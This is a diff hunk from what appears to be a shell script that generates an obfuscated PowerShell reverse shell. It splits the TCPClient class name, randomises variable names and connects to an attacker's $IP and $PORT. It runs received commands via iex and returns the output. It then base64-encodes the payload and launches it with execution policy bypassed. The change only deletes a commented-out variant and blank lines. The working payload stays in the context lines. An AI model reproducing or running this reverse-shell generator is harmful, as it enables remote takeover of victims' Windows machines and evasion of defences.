@@ -422,11 +422,8 @@ sendbyte=$(openssl rand -hex 7)
 bytes=$(openssl rand -hex 5)
 i=$(openssl rand -hex 4)
 shell="\$$tmp= @('sYSteM.nEt.sOc','KEts.tCPClIent');\$$tmp2 = [String]::Join('',\$$tmp);\$$client = New-Object \$$tmp2('$IP',$PORT);\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..65535|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (New-Object -TypeName System.Text.UTF8Encoding).GetString(\$$bytes,0, \$$i);\$$sendback = (iex \$$data 2>&1 | Out-String );\$$sendback2 = \$$sendback + $userinfo +'>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
-#shell="\$$tmp= @('sYSteM.nEt.sOc','KEts.tCPClIent');\$$tmp2 = [String]::Join('',\$$tmp);\$$client = New-Object \$$tmp2('$IP',$PORT);\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..65535|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (New-Object -TypeName System.Text.UTF8Encoding).GetString(\$$bytes,0, \$$i);\$$sendback = (iex \$$data 2>&1 | Out-String );\$$sendback2 = \$$sendback + (\$env:UserName) + '@' + (\$env:UserDomain) + ([System.Environment]::NewLine) + (get-location)+'>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
-
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
-
 
 rev="${pw_sh} ${win} -noprofile -executionpolicy bypass -NoExit -e ${shell}"
 
